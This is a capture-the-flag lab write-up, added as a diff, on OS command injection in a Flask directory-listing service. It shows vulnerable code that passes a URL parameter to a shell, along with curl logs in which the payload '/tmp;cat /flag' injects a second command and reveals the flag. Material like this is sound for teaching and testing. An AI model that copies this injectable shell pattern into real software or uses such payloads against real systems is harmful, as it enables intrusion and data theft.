@@ -1,0 +1,201 @@
+//operating command injection through user controlled parameters
+//this happens when you don't wash it properly 
+// the attacker entered input and directly execute it 
+
+The code:
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/checkpoint", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("target", "/challenge")
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/checkpoint"><input type=text name=target><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+
+The Vulnerable line which directly executes user entered text:
+
+""""    command = f"ls -l {arg}"     """"
+
+just use ; and give the command you want to use 
+
+Terminal 1: start the server
+
+hacker@web-security~cmdi-1:~$ cd /challenge/
+hacker@web-security~cmdi-1:/challenge$ ls
+DESCRIPTION.md  server
+hacker@web-security~cmdi-1:/challenge$ cat server | grep os.system
+hacker@web-security~cmdi-1:/challenge$ cat server | grep os
+import os
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~cmdi-1:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/checkpoint", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("target", "/challenge")
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/checkpoint"><input type=text name=target><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~cmdi-1:/challenge$ /challenge/server 
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+DEBUG: command='ls -l /tmp'
+127.0.0.1 - - [27/Sep/2026 14:58:11] "GET /checkpoint?target=/tmp HTTP/1.1" 200 -
+DEBUG: command='ls -l /tmp;cat /flag'
+127.0.0.1 - - [27/Sep/2026 14:59:36] "GET /checkpoint?target=/tmp;cat%20/flag HTTP/1.1" 200 -
+
+
+
+
+
+Terminal 2:
+start grouping the weak developer 
+
+hacker@web-security~cmdi-1:/challenge$ curl -v http://challenge.localhost/checkpoint?target=/tmp
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 46472 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 58332 
+* using HTTP/1.x
+> GET /checkpoint?target=/tmp HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.21.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Sun, 27 Sep 2026 14:58:11 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 494
+< Connection: close
+< 
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/checkpoint"><input type=text name=target><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /tmp:</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+</pre>
+        </body></html>
+* shutting down connection #0
+hacker@web-security~cmdi-1:/challenge$ llenge$ curl -v 'hallenge.localhost/checkpoint?target=/tmpget=/tmp;cat /flag'
+* URL rejected: Malformed input to a URL function
+curl: (3) URL rejected: Malformed input to a URL function
+hacker@web-security~cmdi-1:/challenge$ curl -v 'http://challenge.localhost/checkpoint?target=/tmp;cat /flag'
+* URL rejected: Malformed input to a URL function
+curl: (3) URL rejected: Malformed input to a URL function
+hacker@web-security~cmdi-1:/challenge$ curl -v 'http://challenge.localhost/checkpoint?target=/tmp;cat%20/flag'
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 38920 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 60584 
+* using HTTP/1.x
+> GET /checkpoint?target=/tmp;cat%20/flag HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.21.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Sun, 27 Sep 2026 14:59:36 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 564
+< Connection: close
+< 
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/checkpoint"><input type=text name=target><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /tmp;cat /flag:</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+pwn.college{E-xGFluH_Xaxx9578pQy8uk12fC.QX1YTN2wCN2cDOxIzW}
+</pre>
+        </body></html>
+* shutting down connection #0
+
